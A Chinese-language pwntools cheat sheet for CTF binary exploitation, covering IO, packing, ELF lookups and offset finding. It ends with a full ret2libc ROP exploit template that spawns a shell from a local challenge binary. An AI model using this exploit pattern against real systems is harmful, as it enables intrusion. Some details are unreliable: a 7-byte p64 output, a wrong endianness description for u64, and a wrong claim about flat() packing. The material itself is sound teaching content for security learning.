Pwn 脚本常用函数

Pwntools 常用函数详解，包含使用场景和输出示例。

安装与环境

安装 pwntools
pip install pwntools
初始模板
from pwn import *

context.arch = 'amd64'  # 设置架构
context.log_level = 'debug'  # 设置日志级别

# 本地调试
p = process('./binary')

IO 通信函数

recv() 接收数据 
# 接收所有数据
data = p.recv()

# 接收最多N字节
data = p.recv(1024)

# 接收直到超时
data = p.recv(timeout=1)
b'Hello World!\nWelcome to Pwn\n'
recvline() 接收一行 
# 接收一行（直到\n）
line = p.recvline()

# 接收N行
lines = p.recvlines(3)
b'Enter password: '
recvuntil() 接收直到指定内容 
# 接收直到出现指定字符串
p.recvuntil(b'password: ')  # 接收直到出现 "password: "

# 配合decode使用
password = b'admin123'
p.sendline(password)
# 程序输出: Enter password: [光标停在这里]
send() / sendline() 发送数据 
# send - 发送原始数据（不换行）
p.send(b'AAAA')

# sendline - 发送数据+换行符
p.sendline(b'AAAA')  # 相当于 b'AAAA\n'

# sendafter - 接收后再发送
p.sendafter(b'username: ', b'admin')

# sla - sendlineafter 的别名
p.sla(b'username: ', b'admin')
interactive() 交互模式（获取shell后使用） 
# 获取shell后，切换到交互模式
# 就可以像真的终端一样操作了
p.interactive()

# 会看到:
# [*] Switching to interactive mode
# $ whoami
# root
recvall() 接收所有数据直到EOF 
# 接收所有数据直到连接关闭
data = p.recvall()

# 常用于程序结束前的输出
p.recvall()
print("Done!")

打包/解包函数

p64() / p32() 打包成64位/32位整数（小端序） 
# 64位打包 - 地址等
win_addr = 0x401156
payload = p64(win_addr)

# 32位打包 - int等
value = 0xdeadbeef
payload = p32(value)

# 用法示例
payload = b'A' * 40
payload += p64(win_addr)  # 覆盖返回地址
p64(0x401156) = b'V\x11@\x00\x00\x00\x00'
p32(0xdeadbeef) = b'\xef\xbe\xad\xde'
u64() / u32() 解包成整数（大端序→小端序） 
# 接收8字节并解包为64位整数
data = p.recv(8)
addr = u64(data)

# 接收4字节并解包为32位整数
data = p.recv(4)
value = u32(data)

# 注意：recv数据可能需要补零
addr = u64(data.ljust(8, b'\x00'))
b'V\x11@\x00\x00\x00\x00' → 0x401156
flat() 打包多个值（推荐） 
# 打包多个值，自动处理对齐
payload = flat(
    b'A' * 40,        # 填充
    0x401156,        # 自动p64
    0x12345678,      # 自动p32
    b'BBBB',          # 字符串
    b'\x00' * 10      # 填充字节
)

# 比 p64() + b'' 拼接更简洁
payload = b'A' * 40 + p64(0x401156)

# 等价于
payload = flat(b'A' * 40, 0x401156)
fmtstr_payload() 格式化字符串自动生成 
from pwn import fmtstr_payload

# 自动生成格式化字符串payload
# offset: 第几个参数开始
# writes: {地址: 值} 字典

payload = fmtstr_payload(6, {0x404100: 0xbeef})
# 生成: b'\x00\x41@\x00\x00\x00\x00\x00%6c%7$hhn%8c%7$hhn...'

# 写入多个地址
payload = fmtstr_payload(7, {
    addr1: value1,
    addr2: value2,
})

ELF 文件操作

ELF() 加载ELF文件获取符号信息 
# 加载ELF
elf = ELF('./challenge')

# 获取函数地址
win_addr = elf.symbols['win']      # win函数地址
main_addr = elf.symbols['main']     # main函数地址

# 获取GOT/PLT地址
puts_got = elf.got['puts']         # puts的GOT地址
puts_plt = elf.plt['puts']         # puts的PLT地址

# 获取任意地址处的数据
data = elf.read(addr, 10)           # 读取addr处10字节

# 检查binary信息
print(elf.arch)                    # 'amd64'
print(elf.path)                    # './challenge'
win @ 0x401156
puts @ PLT: 0x401030, GOT: 0x404018
search() 搜索内存/ELF中的数据 
# 搜索字符串
bin_sh_addr = next(elf.search(b'/bin/sh'))

# 搜索字节序列
addr = next(elf.search(b'\xcc\x90'))  # 搜索 \xcc\x90 (INT3+NOP)

# 搜索所有地址中的字符串
for addr in elf.search(b'admin'):     # 搜索 "admin"
    print(hex(addr))

# 在libc中搜索
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
/bin/sh @ 0x402008

崩溃定位函数

cyclic() 生成唯一字符序列（找溢出点） 
# 生成200字节的唯一序列
pattern = cyclic(200)

# 发送后程序崩溃
p.sendline(pattern)

# 在gdb中会看到类似:
# Program received signal SIGSEGV, Segmentation fault.
# 0x6161616d in ?? ()

# 找到崩溃位置的4字节
crash_offset = cyclic_find(b'aaam')  # 找 "aaam" 在序列中位置
# 序列: aaaabaaacaaadaaaeaaafaaagaaahaaa... (每4字节不同)
# 崩溃位置: 0x6161616d = 'aaam'
cyclic_find(b'aaam') = 40
cyclic_find() 从崩溃地址找溢出偏移 
# 从RIP崩溃地址找溢出偏移
# 崩溃地址: 0x6161616d (对应序列中的 "aaam")
offset = cyclic_find(0x6161616d)

# 或者直接用字符串
offset = cyclic_find(b'aaam')

print(f"Overflow offset: {offset}")
# 输出: Overflow offset: 40
Overflow offset: 40

ELF() + process() 组合使用获取libc地址 
# 完整示例：泄露libc地址

# 启动进程
p = process(elf.path)

# 泄露puts地址
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

# ROP链：调用puts打印puts@got内容
# ... 构造payload ...

# 解析泄露的地址

完整解题脚本示例 

#!/usr/bin/env python3
from pwn import *

# 设置
context.arch = 'amd64'
context.log_level = 'debug'

# 启动进程
p = process('./challenge')

# 加载ELF
elf = ELF('./challenge')

# ========== 信息泄露阶段 ==========
log.info("Leaking libc address...")

# 接收输出直到某个提示
p.recvuntil(b'puts @ ')
puts_addr = int(p.recvline().strip(), 16)
log.info("puts @ 0x%x", puts_addr)

# 计算libc基地址
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']
log.success("libc @ 0x%x", libc.address)

# ========== 构造ROP链 ==========
log.info("Building ROP chain...")

# gadgets
pop_rdi = 0x401223
ret = 0x401224

# system("/bin/sh")
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
log.info("system @ 0x%x", system_addr)
log.info("/bin/sh @ 0x%x", bin_sh)

# ========== 发送payload ==========
payload = flat(
    b'A' * 40,       # 填充到返回地址
    pop_rdi,          # pop rdi; ret
    bin_sh,          # rdi = /bin/sh 地址
    system_addr      # call system("/bin/sh")
)

p.sendline(payload)

# ========== 获取shell ==========
log.success("Getting shell...")
p.interactive()

函数速查表

IO
recv() - 接收

recvuntil() - 接收直到
send() - 发送

interactive() - 交互
打包
p64() - 64位打包
p32() - 32位打包
u64() - 64位解包
u32() - 32位解包
flat() - 打包多个值
fmtstr_payload() - 格式化串
ELF
ELF() - 加载ELF
.symbols[] - 函数地址
.got[] - GOT地址
.plt[] - PLT地址
.search() - 搜索
.read() - 读内存
日志

log.success() - 成功
log.warning() - 警告
